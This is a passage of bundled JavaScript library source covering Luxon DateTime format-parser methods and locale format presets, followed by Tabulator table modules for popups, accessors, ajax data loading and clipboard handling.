   * @returns {TokenParser} - opaque object to be used
   */
  static buildFormatParser(fmt, options = {}) {
    const { locale = null, numberingSystem = null } = options, localeToUse = Locale.fromOpts({
      locale,
      numberingSystem,
      defaultToEN: true
    });
    return new TokenParser(localeToUse, fmt);
  }
  /**
   * Create a DateTime from an input string and format parser.
   *
   * The format parser must have been created with the same locale as this call.
   *
   * @param {String} text - the string to parse
   * @param {TokenParser} formatParser - parser from {@link DateTime.buildFormatParser}
   * @param {Object} opts - options taken by fromFormat()
   * @returns {DateTime}
   */
  static fromFormatParser(text, formatParser, opts = {}) {
    if (isUndefined(text) || isUndefined(formatParser)) {
      throw new InvalidArgumentError(
        "fromFormatParser requires an input string and a format parser"
      );
    }
    const { locale = null, numberingSystem = null } = opts, localeToUse = Locale.fromOpts({
      locale,
      numberingSystem,
      defaultToEN: true
    });
    if (!localeToUse.equals(formatParser.locale)) {
      throw new InvalidArgumentError(
        `fromFormatParser called with a locale of ${localeToUse}, but the format parser was created for ${formatParser.locale}`
      );
    }
    const { result, zone, specificOffset, invalidReason } = formatParser.explainFromTokens(text);
    if (invalidReason) {
      return DateTime.invalid(invalidReason);
    } else {
      return parseDataToDateTime(
        result,
        zone,
        opts,
        `format ${formatParser.format}`,
        text,
        specificOffset
      );
    }
  }
  // FORMAT PRESETS
  /**
   * {@link DateTime#toLocaleString} format like 10/14/1983
   * @type {Object}
   */
  static get DATE_SHORT() {
    return DATE_SHORT;
  }
  /**
   * {@link DateTime#toLocaleString} format like 'Oct 14, 1983'
   * @type {Object}
   */
  static get DATE_MED() {
    return DATE_MED;
  }
  /**
   * {@link DateTime#toLocaleString} format like 'Fri, Oct 14, 1983'
   * @type {Object}
   */
  static get DATE_MED_WITH_WEEKDAY() {
    return DATE_MED_WITH_WEEKDAY;
  }
  /**
   * {@link DateTime#toLocaleString} format like 'October 14, 1983'
   * @type {Object}
   */
  static get DATE_FULL() {
    return DATE_FULL;
  }
  /**
   * {@link DateTime#toLocaleString} format like 'Tuesday, October 14, 1983'
   * @type {Object}
   */
  static get DATE_HUGE() {
    return DATE_HUGE;
  }
  /**
   * {@link DateTime#toLocaleString} format like '09:30 AM'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get TIME_SIMPLE() {
    return TIME_SIMPLE;
  }
  /**
   * {@link DateTime#toLocaleString} format like '09:30:23 AM'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get TIME_WITH_SECONDS() {
    return TIME_WITH_SECONDS;
  }
  /**
   * {@link DateTime#toLocaleString} format like '09:30:23 AM EDT'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get TIME_WITH_SHORT_OFFSET() {
    return TIME_WITH_SHORT_OFFSET;
  }
  /**
   * {@link DateTime#toLocaleString} format like '09:30:23 AM Eastern Daylight Time'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get TIME_WITH_LONG_OFFSET() {
    return TIME_WITH_LONG_OFFSET;
  }
  /**
   * {@link DateTime#toLocaleString} format like '09:30', always 24-hour.
   * @type {Object}
   */
  static get TIME_24_SIMPLE() {
    return TIME_24_SIMPLE;
  }
  /**
   * {@link DateTime#toLocaleString} format like '09:30:23', always 24-hour.
   * @type {Object}
   */
  static get TIME_24_WITH_SECONDS() {
    return TIME_24_WITH_SECONDS;
  }
  /**
   * {@link DateTime#toLocaleString} format like '09:30:23 EDT', always 24-hour.
   * @type {Object}
   */
  static get TIME_24_WITH_SHORT_OFFSET() {
    return TIME_24_WITH_SHORT_OFFSET;
  }
  /**
   * {@link DateTime#toLocaleString} format like '09:30:23 Eastern Daylight Time', always 24-hour.
   * @type {Object}
   */
  static get TIME_24_WITH_LONG_OFFSET() {
    return TIME_24_WITH_LONG_OFFSET;
  }
  /**
   * {@link DateTime#toLocaleString} format like '10/14/1983, 9:30 AM'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get DATETIME_SHORT() {
    return DATETIME_SHORT;
  }
  /**
   * {@link DateTime#toLocaleString} format like '10/14/1983, 9:30:33 AM'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get DATETIME_SHORT_WITH_SECONDS() {
    return DATETIME_SHORT_WITH_SECONDS;
  }
  /**
   * {@link DateTime#toLocaleString} format like 'Oct 14, 1983, 9:30 AM'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get DATETIME_MED() {
    return DATETIME_MED;
  }
  /**
   * {@link DateTime#toLocaleString} format like 'Oct 14, 1983, 9:30:33 AM'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get DATETIME_MED_WITH_SECONDS() {
    return DATETIME_MED_WITH_SECONDS;
  }
  /**
   * {@link DateTime#toLocaleString} format like 'Fri, 14 Oct 1983, 9:30 AM'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get DATETIME_MED_WITH_WEEKDAY() {
    return DATETIME_MED_WITH_WEEKDAY;
  }
  /**
   * {@link DateTime#toLocaleString} format like 'October 14, 1983, 9:30 AM EDT'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get DATETIME_FULL() {
    return DATETIME_FULL;
  }
  /**
   * {@link DateTime#toLocaleString} format like 'October 14, 1983, 9:30:33 AM EDT'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get DATETIME_FULL_WITH_SECONDS() {
    return DATETIME_FULL_WITH_SECONDS;
  }
  /**
   * {@link DateTime#toLocaleString} format like 'Friday, October 14, 1983, 9:30 AM Eastern Daylight Time'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get DATETIME_HUGE() {
    return DATETIME_HUGE;
  }
  /**
   * {@link DateTime#toLocaleString} format like 'Friday, October 14, 1983, 9:30:33 AM Eastern Daylight Time'. Only 12-hour if the locale is.
   * @type {Object}
   */
  static get DATETIME_HUGE_WITH_SECONDS() {
    return DATETIME_HUGE_WITH_SECONDS;
  }
}
function friendlyDateTime(dateTimeish) {
  if (DateTime.isDateTime(dateTimeish)) {
    return dateTimeish;
  } else if (dateTimeish && dateTimeish.valueOf && isNumber(dateTimeish.valueOf())) {
    return DateTime.fromJSDate(dateTimeish);
  } else if (dateTimeish && typeof dateTimeish === "object") {
    return DateTime.fromObject(dateTimeish);
  } else {
    throw new InvalidArgumentError(
      `Unknown datetime argument: ${dateTimeish}, of type ${typeof dateTimeish}`
    );
  }
}
class CoreFeature {
  constructor(table) {
    this.table = table;
  }
  //////////////////////////////////////////
  /////////////// DataLoad /////////////////
  //////////////////////////////////////////
  reloadData(data, silent, columnsChanged) {
    return this.table.dataLoader.load(data, void 0, void 0, void 0, silent, columnsChanged);
  }
  //////////////////////////////////////////
  ///////////// Localization ///////////////
  //////////////////////////////////////////
  langText() {
    return this.table.modules.localize.getText(...arguments);
  }
  langBind() {
    return this.table.modules.localize.bind(...arguments);
  }
  langLocale() {
    return this.table.modules.localize.getLocale(...arguments);
  }
  //////////////////////////////////////////
  ////////// Inter Table Comms /////////////
  //////////////////////////////////////////
  commsConnections() {
    return this.table.modules.comms.getConnections(...arguments);
  }
  commsSend() {
    return this.table.modules.comms.send(...arguments);
  }
  //////////////////////////////////////////
  //////////////// Layout  /////////////////
  //////////////////////////////////////////
  layoutMode() {
    return this.table.modules.layout.getMode();
  }
  layoutRefresh(force) {
    return this.table.modules.layout.layout(force);
  }
  //////////////////////////////////////////
  /////////////// Event Bus ////////////////
  //////////////////////////////////////////
  subscribe() {
    return this.table.eventBus.subscribe(...arguments);
  }
  unsubscribe() {
    return this.table.eventBus.unsubscribe(...arguments);
  }
  subscribed(key) {
    return this.table.eventBus.subscribed(key);
  }
  subscriptionChange() {
    return this.table.eventBus.subscriptionChange(...arguments);
  }
  dispatch() {
    return this.table.eventBus.dispatch(...arguments);
  }
  chain() {
    return this.table.eventBus.chain(...arguments);
  }
  confirm() {
    return this.table.eventBus.confirm(...arguments);
  }
  dispatchExternal() {
    return this.table.externalEvents.dispatch(...arguments);
  }
  subscribedExternal(key) {
    return this.table.externalEvents.subscribed(key);
  }
  subscriptionChangeExternal() {
    return this.table.externalEvents.subscriptionChange(...arguments);
  }
  //////////////////////////////////////////
  //////////////// Options /////////////////
  //////////////////////////////////////////
  options(key) {
    return this.table.options[key];
  }
  setOption(key, value) {
    if (typeof value !== "undefined") {
      this.table.options[key] = value;
    }
    return this.table.options[key];
  }
  //////////////////////////////////////////
  /////////// Deprecation Checks ///////////
  //////////////////////////////////////////
  deprecationCheck(oldOption, newOption, convert) {
    return this.table.deprecationAdvisor.check(oldOption, newOption, convert);
  }
  deprecationCheckMsg(oldOption, msg) {
    return this.table.deprecationAdvisor.checkMsg(oldOption, msg);
  }
  deprecationMsg(msg) {
    return this.table.deprecationAdvisor.msg(msg);
  }
  //////////////////////////////////////////
  //////////////// Modules /////////////////
  //////////////////////////////////////////
  module(key) {
    return this.table.module(key);
  }
}
class Helpers {
  static elVisible(el) {
    return !(el.offsetWidth <= 0 && el.offsetHeight <= 0);
  }
  static elOffset(el) {
    var box = el.getBoundingClientRect();
    return {
      top: box.top + window.pageYOffset - document.documentElement.clientTop,
      left: box.left + window.pageXOffset - document.documentElement.clientLeft
    };
  }
  static retrieveNestedData(separator, field, data) {
    var structure = separator ? field.split(separator) : [field], length = structure.length, output;
    for (let i2 = 0; i2 < length; i2++) {
      data = data[structure[i2]];
      output = data;
      if (!data) {
        break;
      }
    }
    return output;
  }
  static deepClone(obj, clone2, list2 = []) {
    var objectProto = {}.__proto__, arrayProto = [].__proto__;
    if (!clone2) {
      clone2 = Object.assign(Array.isArray(obj) ? [] : {}, obj);
    }
    for (var i2 in obj) {
      let subject = obj[i2], match2, copy2;
      if (subject != null && typeof subject === "object" && (subject.__proto__ === objectProto || subject.__proto__ === arrayProto)) {
        match2 = list2.findIndex((item) => {
          return item.subject === subject;
        });
        if (match2 > -1) {
          clone2[i2] = list2[match2].copy;
        } else {
          copy2 = Object.assign(Array.isArray(subject) ? [] : {}, subject);
          list2.unshift({ subject, copy: copy2 });
          clone2[i2] = this.deepClone(subject, copy2, list2);
        }
      }
    }
    return clone2;
  }
}
let Popup$1 = class Popup extends CoreFeature {
  constructor(table, element, parent) {
    super(table);
    this.element = element;
    this.container = this._lookupContainer();
    this.parent = parent;
    this.reversedX = false;
    this.childPopup = null;
    this.blurable = false;
    this.blurCallback = null;
    this.blurEventsBound = false;
    this.renderedCallback = null;
    this.visible = false;
    this.hideable = true;
    this.element.classList.add("tabulator-popup-container");
    this.blurEvent = this.hide.bind(this, false);
    this.escEvent = this._escapeCheck.bind(this);
    this.destroyBinding = this.tableDestroyed.bind(this);
    this.destroyed = false;
  }
  tableDestroyed() {
    this.destroyed = true;
    this.hide(true);
  }
  _lookupContainer() {
    var container = this.table.options.popupContainer;
    if (typeof container === "string") {
      container = document.querySelector(container);
      if (!container) {
        console.warn("Menu Error - no container element found matching selector:", this.table.options.popupContainer, "(defaulting to document body)");
      }
    } else if (container === true) {
      container = this.table.element;
    }
    if (container && !this._checkContainerIsParent(container)) {
      container = false;
      console.warn("Menu Error - container element does not contain this table:", this.table.options.popupContainer, "(defaulting to document body)");
    }
    if (!container) {
      container = document.body;
    }
    return container;
  }
  _checkContainerIsParent(container, element = this.table.element) {
    if (container === element) {
      return true;
    } else {
      return element.parentNode ? this._checkContainerIsParent(container, element.parentNode) : false;
    }
  }
  renderCallback(callback) {
    this.renderedCallback = callback;
  }
  containerEventCoords(e2) {
    var touch = !(e2 instanceof MouseEvent);
    var x = touch ? e2.touches[0].pageX : e2.pageX;
    var y3 = touch ? e2.touches[0].pageY : e2.pageY;
    if (this.container !== document.body) {
      let parentOffset = Helpers.elOffset(this.container);
      x -= parentOffset.left;
      y3 -= parentOffset.top;
    }
    return { x, y: y3 };
  }
  elementPositionCoords(element, position = "right") {
    var offset2 = Helpers.elOffset(element), containerOffset, x, y3;
    if (this.container !== document.body) {
      containerOffset = Helpers.elOffset(this.container);
      offset2.left -= containerOffset.left;
      offset2.top -= containerOffset.top;
    }
    switch (position) {
      case "right":
        x = offset2.left + element.offsetWidth;
        y3 = offset2.top - 1;
        break;
      case "bottom":
        x = offset2.left;
        y3 = offset2.top + element.offsetHeight;
        break;
      case "left":
        x = offset2.left;
        y3 = offset2.top - 1;
        break;
      case "top":
        x = offset2.left;
        y3 = offset2.top;
        break;
      case "center":
        x = offset2.left + element.offsetWidth / 2;
        y3 = offset2.top + element.offsetHeight / 2;
        break;
    }
    return { x, y: y3, offset: offset2 };
  }
  show(origin, position) {
    var x, y3, parentEl, parentOffset, coords;
    if (this.destroyed || this.table.destroyed) {
      return this;
    }
    if (origin instanceof HTMLElement) {
      parentEl = origin;
      coords = this.elementPositionCoords(origin, position);
      parentOffset = coords.offset;
      x = coords.x;
      y3 = coords.y;
    } else if (typeof origin === "number") {
      parentOffset = { top: 0, left: 0 };
      x = origin;
      y3 = position;
    } else {
      coords = this.containerEventCoords(origin);
      x = coords.x;
      y3 = coords.y;
      this.reversedX = false;
    }
    this.element.style.top = y3 + "px";
    this.element.style.left = x + "px";
    this.container.appendChild(this.element);
    if (typeof this.renderedCallback === "function") {
      this.renderedCallback();
    }
    this._fitToScreen(x, y3, parentEl, parentOffset, position);
    this.visible = true;
    this.subscribe("table-destroy", this.destroyBinding);
    this.element.addEventListener("mousedown", (e2) => {
      e2.stopPropagation();
    });
    return this;
  }
  _fitToScreen(x, y3, parentEl, parentOffset, position) {
    var scrollTop = this.container === document.body ? document.documentElement.scrollTop : this.container.scrollTop;
    if (x + this.element.offsetWidth >= this.container.offsetWidth || this.reversedX) {
      this.element.style.left = "";
      if (parentEl) {
        this.element.style.right = this.container.offsetWidth - parentOffset.left + "px";
      } else {
        this.element.style.right = this.container.offsetWidth - x + "px";
      }
      this.reversedX = true;
    }
    let offsetHeight = Math.max(this.container.offsetHeight, scrollTop ? this.container.scrollHeight : 0);
    if (y3 + this.element.offsetHeight > offsetHeight) {
      if (parentEl) {
        switch (position) {
          case "bottom":
            this.element.style.top = parseInt(this.element.style.top) - this.element.offsetHeight - parentEl.offsetHeight - 1 + "px";
            break;
          default:
            this.element.style.top = parseInt(this.element.style.top) - this.element.offsetHeight + parentEl.offsetHeight + 1 + "px";
        }
      } else {
        this.element.style.height = offsetHeight + "px";
      }
    }
  }
  isVisible() {
    return this.visible;
  }
  hideOnBlur(callback) {
    this.blurable = true;
    if (this.visible) {
      setTimeout(() => {
        if (this.visible) {
          this.table.rowManager.element.addEventListener("scroll", this.blurEvent);
          this.subscribe("cell-editing", this.blurEvent);
          document.body.addEventListener("click", this.blurEvent);
          document.body.addEventListener("contextmenu", this.blurEvent);
          document.body.addEventListener("mousedown", this.blurEvent);
          window.addEventListener("resize", this.blurEvent);
          document.body.addEventListener("keydown", this.escEvent);
          this.blurEventsBound = true;
        }
      }, 100);
      this.blurCallback = callback;
    }
    return this;
  }
  _escapeCheck(e2) {
    if (e2.keyCode == 27) {
      this.hide();
    }
  }
  blockHide() {
    this.hideable = false;
  }
  restoreHide() {
    this.hideable = true;
  }
  hide(silent = false) {
    if (this.visible && this.hideable) {
      if (this.blurable && this.blurEventsBound) {
        document.body.removeEventListener("keydown", this.escEvent);
        document.body.removeEventListener("click", this.blurEvent);
        document.body.removeEventListener("contextmenu", this.blurEvent);
        document.body.removeEventListener("mousedown", this.blurEvent);
        window.removeEventListener("resize", this.blurEvent);
        this.table.rowManager.element.removeEventListener("scroll", this.blurEvent);
        this.unsubscribe("cell-editing", this.blurEvent);
        this.blurEventsBound = false;
      }
      if (this.childPopup) {
        this.childPopup.hide();
      }
      if (this.parent) {
        this.parent.childPopup = null;
      }
      if (this.element.parentNode) {
        this.element.parentNode.removeChild(this.element);
      }
      this.visible = false;
      if (this.blurCallback && !silent) {
        this.blurCallback();
      }
      this.unsubscribe("table-destroy", this.destroyBinding);
    }
    return this;
  }
  child(element) {
    if (this.childPopup) {
      this.childPopup.hide();
    }
    this.childPopup = new Popup(this.table, element, this);
    return this.childPopup;
  }
};
class Module extends CoreFeature {
  constructor(table, name) {
    super(table);
    this._handler = null;
  }
  initialize() {
  }
  ///////////////////////////////////
  ////// Options Registration ///////
  ///////////////////////////////////
  registerTableOption(key, value) {
    this.table.optionsList.register(key, value);
  }
  registerColumnOption(key, value) {
    this.table.columnManager.optionsList.register(key, value);
  }
  ///////////////////////////////////
  /// Public Function Registration ///
  ///////////////////////////////////
  registerTableFunction(name, func) {
    if (typeof this.table[name] === "undefined") {
      this.table[name] = (...args) => {
        this.table.initGuard(name);
        return func(...args);
      };
    } else {
      console.warn("Unable to bind table function, name already in use", name);
    }
  }
  registerComponentFunction(component, func, handler) {
    return this.table.componentFunctionBinder.bind(component, func, handler);
  }
  ///////////////////////////////////
  ////////// Data Pipeline //////////
  ///////////////////////////////////
  registerDataHandler(handler, priority) {
    this.table.rowManager.registerDataPipelineHandler(handler, priority);
    this._handler = handler;
  }
  registerDisplayHandler(handler, priority) {
    this.table.rowManager.registerDisplayPipelineHandler(handler, priority);
    this._handler = handler;
  }
  displayRows(adjust) {
    var index = this.table.rowManager.displayRows.length - 1, lookupIndex;
    if (this._handler) {
      lookupIndex = this.table.rowManager.displayPipeline.findIndex((item) => {
        return item.handler === this._handler;
      });
      if (lookupIndex > -1) {
        index = lookupIndex;
      }
    }
    if (adjust) {
      index = index + adjust;
    }
    if (this._handler) {
      if (index > -1) {
        return this.table.rowManager.getDisplayRows(index);
      } else {
        return this.activeRows();
      }
    }
  }
  activeRows() {
    return this.table.rowManager.activeRows;
  }
  refreshData(renderInPosition, handler) {
    if (!handler) {
      handler = this._handler;
    }
    if (handler) {
      this.table.rowManager.refreshActiveData(handler, false, renderInPosition);
    }
  }
  ///////////////////////////////////
  //////// Footer Management ////////
  ///////////////////////////////////
  footerAppend(element) {
    return this.table.footerManager.append(element);
  }
  footerPrepend(element) {
    return this.table.footerManager.prepend(element);
  }
  footerRemove(element) {
    return this.table.footerManager.remove(element);
  }
  ///////////////////////////////////
  //////// Popups Management ////////
  ///////////////////////////////////
  popup(menuEl, menuContainer) {
    return new Popup$1(this.table, menuEl, menuContainer);
  }
  ///////////////////////////////////
  //////// Alert Management ////////
  ///////////////////////////////////
  alert(content, type) {
    return this.table.alertManager.alert(content, type);
  }
  clearAlert() {
    return this.table.alertManager.clear();
  }
}
var defaultAccessors = {
  rownum: function(value, data, type, params, column, row) {
    return row.getPosition();
  }
};
class Accessor extends Module {
  static moduleName = "accessor";
  //load defaults
  static accessors = defaultAccessors;
  constructor(table) {
    super(table);
    this.allowedTypes = ["", "data", "download", "clipboard", "print", "htmlOutput"];
    this.registerColumnOption("accessor");
    this.registerColumnOption("accessorParams");
    this.registerColumnOption("accessorData");
    this.registerColumnOption("accessorDataParams");
    this.registerColumnOption("accessorDownload");
    this.registerColumnOption("accessorDownloadParams");
    this.registerColumnOption("accessorClipboard");
    this.registerColumnOption("accessorClipboardParams");
    this.registerColumnOption("accessorPrint");
    this.registerColumnOption("accessorPrintParams");
    this.registerColumnOption("accessorHtmlOutput");
    this.registerColumnOption("accessorHtmlOutputParams");
  }
  initialize() {
    this.subscribe("column-layout", this.initializeColumn.bind(this));
    this.subscribe("row-data-retrieve", this.transformRow.bind(this));
  }
  //initialize column accessor
  initializeColumn(column) {
    var match2 = false, config = {};
    this.allowedTypes.forEach((type) => {
      var key = "accessor" + (type.charAt(0).toUpperCase() + type.slice(1)), accessor;
      if (column.definition[key]) {
        accessor = this.lookupAccessor(column.definition[key]);
        if (accessor) {
          match2 = true;
          config[key] = {
            accessor,
            params: column.definition[key + "Params"] || {}
          };
        }
      }
    });
    if (match2) {
      column.modules.accessor = config;
    }
  }
  lookupAccessor(value) {
    var accessor = false;
    switch (typeof value) {
      case "string":
        if (Accessor.accessors[value]) {
          accessor = Accessor.accessors[value];
        } else {
          console.warn("Accessor Error - No such accessor found, ignoring: ", value);
        }
        break;
      case "function":
        accessor = value;
        break;
    }
    return accessor;
  }
  //apply accessor to row
  transformRow(row, type) {
    var key = "accessor" + (type.charAt(0).toUpperCase() + type.slice(1)), rowComponent = row.getComponent();
    var data = Helpers.deepClone(row.data || {});
    this.table.columnManager.traverse(function(column) {
      var value, accessor, params, colComponent;
      if (column.modules.accessor) {
        accessor = column.modules.accessor[key] || column.modules.accessor.accessor || false;
        if (accessor) {
          value = column.getFieldValue(data);
          if (value != "undefined") {
            colComponent = column.getComponent();
            params = typeof accessor.params === "function" ? accessor.params(value, data, type, colComponent, rowComponent) : accessor.params;
            column.setFieldValue(data, accessor.accessor(value, data, type, params, colComponent, rowComponent));
          }
        }
      }
    });
    return data;
  }
}
var defaultConfig = {
  method: "GET"
};
function generateParamsList$1(data, prefix) {
  var output = [];
  prefix = prefix || "";
  if (Array.isArray(data)) {
    data.forEach((item, i2) => {
      output = output.concat(generateParamsList$1(item, prefix ? prefix + "[" + i2 + "]" : i2));
    });
  } else if (typeof data === "object") {
    for (var key in data) {
      output = output.concat(generateParamsList$1(data[key], prefix ? prefix + "[" + key + "]" : key));
    }
  } else {
    output.push({ key: prefix, value: data });
  }
  return output;
}
function serializeParams(params) {
  var output = generateParamsList$1(params), encoded = [];
  output.forEach(function(item) {
    encoded.push(encodeURIComponent(item.key) + "=" + encodeURIComponent(item.value));
  });
  return encoded.join("&");
}
function urlBuilder(url, config, params) {
  if (url) {
    if (params && Object.keys(params).length) {
      if (!config.method || config.method.toLowerCase() == "get") {
        config.method = "get";
        url += (url.includes("?") ? "&" : "?") + serializeParams(params);
      }
    }
  }
  return url;
}
function defaultLoaderPromise(url, config, params) {
  var contentType;
  return new Promise((resolve, reject) => {
    url = this.urlGenerator.call(this.table, url, config, params);
    if (config.method.toUpperCase() != "GET") {
      contentType = typeof this.table.options.ajaxContentType === "object" ? this.table.options.ajaxContentType : this.contentTypeFormatters[this.table.options.ajaxContentType];
      if (contentType) {
        for (var key in contentType.headers) {
          if (!config.headers) {
            config.headers = {};
          }
          if (typeof config.headers[key] === "undefined") {
            config.headers[key] = contentType.headers[key];
          }
        }
        config.body = contentType.body.call(this, url, config, params);
      } else {
        console.warn("Ajax Error - Invalid ajaxContentType value:", this.table.options.ajaxContentType);
      }
    }
    if (url) {
      if (typeof config.headers === "undefined") {
        config.headers = {};
      }
      if (typeof config.headers.Accept === "undefined") {
        config.headers.Accept = "application/json";
      }
      if (typeof config.headers["X-Requested-With"] === "undefined") {
        config.headers["X-Requested-With"] = "XMLHttpRequest";
      }
      if (typeof config.mode === "undefined") {
        config.mode = "cors";
      }
      if (config.mode == "cors") {
        if (typeof config.headers["Origin"] === "undefined") {
          config.headers["Origin"] = window.location.origin;
        }
        if (typeof config.credentials === "undefined") {
          config.credentials = "same-origin";
        }
      } else {
        if (typeof config.credentials === "undefined") {
          config.credentials = "include";
        }
      }
      fetch(url, config).then((response) => {
        if (response.ok) {
          response.json().then((data) => {
            resolve(data);
          }).catch((error2) => {
            reject(error2);
            console.warn("Ajax Load Error - Invalid JSON returned", error2);
          });
        } else {
          console.error("Ajax Load Error - Connection Error: " + response.status, response.statusText);
          reject(response);
        }
      }).catch((error2) => {
        console.error("Ajax Load Error - Connection Error: ", error2);
        reject(error2);
      });
    } else {
      console.warn("Ajax Load Error - No URL Set");
      resolve([]);
    }
  });
}
function generateParamsList(data, prefix) {
  var output = [];
  prefix = prefix || "";
  if (Array.isArray(data)) {
    data.forEach((item, i2) => {
      output = output.concat(generateParamsList(item, prefix ? prefix + "[" + i2 + "]" : i2));
    });
  } else if (typeof data === "object") {
    for (var key in data) {
      output = output.concat(generateParamsList(data[key], prefix ? prefix + "[" + key + "]" : key));
    }
  } else {
    output.push({ key: prefix, value: data });
  }
  return output;
}
var defaultContentTypeFormatters = {
  "json": {
    headers: {
      "Content-Type": "application/json"
    },
    body: function(url, config, params) {
      return JSON.stringify(params);
    }
  },
  "form": {
    headers: {},
    body: function(url, config, params) {
      var output = generateParamsList(params), form = new FormData();
      output.forEach(function(item) {
        form.append(item.key, item.value);
      });
      return form;
    }
  }
};
class Ajax extends Module {
  static moduleName = "ajax";
  //load defaults
  static defaultConfig = defaultConfig;
  static defaultURLGenerator = urlBuilder;
  static defaultLoaderPromise = defaultLoaderPromise;
  static contentTypeFormatters = defaultContentTypeFormatters;
  constructor(table) {
    super(table);
    this.config = {};
    this.url = "";
    this.urlGenerator = false;
    this.params = false;
    this.loaderPromise = false;
    this.registerTableOption("ajaxURL", false);
    this.registerTableOption("ajaxURLGenerator", false);
    this.registerTableOption("ajaxParams", {});
    this.registerTableOption("ajaxConfig", "get");
    this.registerTableOption("ajaxContentType", "form");
    this.registerTableOption("ajaxRequestFunc", false);
    this.registerTableOption("ajaxRequesting", function() {
    });
    this.registerTableOption("ajaxResponse", false);
    this.contentTypeFormatters = Ajax.contentTypeFormatters;
  }
  //initialize setup options
  initialize() {
    this.loaderPromise = this.table.options.ajaxRequestFunc || Ajax.defaultLoaderPromise;
    this.urlGenerator = this.table.options.ajaxURLGenerator || Ajax.defaultURLGenerator;
    if (this.table.options.ajaxURL) {
      this.setUrl(this.table.options.ajaxURL);
    }
    this.setDefaultConfig(this.table.options.ajaxConfig);
    this.registerTableFunction("getAjaxUrl", this.getUrl.bind(this));
    this.subscribe("data-loading", this.requestDataCheck.bind(this));
    this.subscribe("data-params", this.requestParams.bind(this));
    this.subscribe("data-load", this.requestData.bind(this));
  }
  requestParams(data, config, silent, params) {
    var ajaxParams = this.table.options.ajaxParams;
    if (ajaxParams) {
      if (typeof ajaxParams === "function") {
        ajaxParams = ajaxParams.call(this.table);
      }
      params = Object.assign(Object.assign({}, ajaxParams), params);
    }
    return params;
  }
  requestDataCheck(data, params, config, silent) {
    return !!(!data && this.url || typeof data === "string");
  }
  requestData(url, params, config, silent, previousData) {
    var ajaxConfig;
    if (!previousData && this.requestDataCheck(url)) {
      if (url) {
        this.setUrl(url);
      }
      ajaxConfig = this.generateConfig(config);
      return this.sendRequest(this.url, params, ajaxConfig);
    } else {
      return previousData;
    }
  }
  setDefaultConfig(config = {}) {
    this.config = Object.assign({}, Ajax.defaultConfig);
    if (typeof config == "string") {
      this.config.method = config;
    } else {
      Object.assign(this.config, config);
    }
  }
  //load config object
  generateConfig(config = {}) {
    var ajaxConfig = Object.assign({}, this.config);
    if (typeof config == "string") {
      ajaxConfig.method = config;
    } else {
      Object.assign(ajaxConfig, config);
    }
    return ajaxConfig;
  }
  //set request url
  setUrl(url) {
    this.url = url;
  }
  //get request url
  getUrl() {
    return this.url;
  }
  //send ajax request
  sendRequest(url, params, config) {
    if (this.table.options.ajaxRequesting.call(this.table, url, params) !== false) {
      return this.loaderPromise(url, config, params).then((data) => {
        if (this.table.options.ajaxResponse) {
          data = this.table.options.ajaxResponse.call(this.table, url, params, data);
        }
        return data;
      });
    } else {
      return Promise.reject();
    }
  }
}
var defaultPasteActions = {
  replace: function(data) {
    return this.table.setData(data);
  },
  update: function(data) {
    return this.table.updateOrAddData(data);
  },
  insert: function(data) {
    return this.table.addData(data);
  }
};
var defaultPasteParsers = {
  table: function(clipboard) {
    var data = [], headerFindSuccess = true, columns = this.table.columnManager.columns, columnMap = [], rows2 = [];
    clipboard = clipboard.split("\n");
    clipboard.forEach(function(row) {
      data.push(row.split("	"));
    });
    if (data.length && !(data.length === 1 && data[0].length < 2)) {
      data[0].forEach(function(value) {
        var column = columns.find(function(column2) {
          return value && column2.definition.title && value.trim() && column2.definition.title.trim() === value.trim();
        });
        if (column) {
          columnMap.push(column);
        } else {
          headerFindSuccess = false;
        }
      });
      if (!headerFindSuccess) {
        headerFindSuccess = true;
        columnMap = [];
        data[0].forEach(function(value) {
          var column = columns.find(function(column2) {
            return value && column2.field && value.trim() && column2.field.trim() === value.trim();
          });
          if (column) {
            columnMap.push(column);
          } else {
            headerFindSuccess = false;
          }
        });
        if (!headerFindSuccess) {
          columnMap = this.table.columnManager.columnsByIndex;
        }
      }
      if (headerFindSuccess) {
        data.shift();
      }
      data.forEach(function(item) {
        var row = {};
        item.forEach(function(value, i2) {
          if (columnMap[i2]) {
            row[columnMap[i2].field] = value;
          }
        });
        rows2.push(row);
      });
      return rows2;
    } else {
      return false;
    }
  }
};
var bindings$2 = {
  copyToClipboard: ["ctrl + 67", "meta + 67"]
};
var actions$2 = {
  copyToClipboard: function(e2) {
    if (!this.table.modules.edit.currentCell) {
      if (this.table.modExists("clipboard", true)) {
        this.table.modules.clipboard.copy(false, true);
      }
    }
  }
};
var extensions$4 = {
  keybindings: {
    bindings: bindings$2,
    actions: actions$2
  }
};
class Clipboard extends Module {
  static moduleName = "clipboard";
  static moduleExtensions = extensions$4;
  //load defaults
  static pasteActions = defaultPasteActions;
  static pasteParsers = defaultPasteParsers;
  constructor(table) {
    super(table);
    this.mode = true;
    this.pasteParser = function() {
    };
    this.pasteAction = function() {
    };
    this.customSelection = false;
    this.rowRange = false;
    this.blocked = true;
    this.registerTableOption("clipboard", false);
    this.registerTableOption("clipboardCopyStyled", true);
    this.registerTableOption("clipboardCopyConfig", false);
    this.registerTableOption("clipboardCopyFormatter", false);
    this.registerTableOption("clipboardCopyRowRange", "active");
    this.registerTableOption("clipboardPasteParser", "table");
    this.registerTableOption("clipboardPasteAction", "insert");
    this.registerColumnOption("clipboard");
    this.registerColumnOption("titleClipboard");
  }
  initialize() {
    this.mode = this.table.options.clipboard;
    this.rowRange = this.table.options.clipboardCopyRowRange;
    if (this.mode === true || this.mode === "copy") {
      this.table.element.addEventListener("copy", (e2) => {
        var plain, html2, list2;
        if (!this.blocked) {
          e2.preventDefault();
          if (this.customSelection) {
            plain = this.customSelection;
            if (this.table.options.clipboardCopyFormatter) {
              plain = this.table.options.clipboardCopyFormatter("plain", plain);
            }
          } else {
            list2 = this.table.modules.export.generateExportList(this.table.options.clipboardCopyConfig, this.table.options.clipboardCopyStyled, this.rowRange, "clipboard");
            html2 = this.table.modules.export.generateHTMLTable(list2);
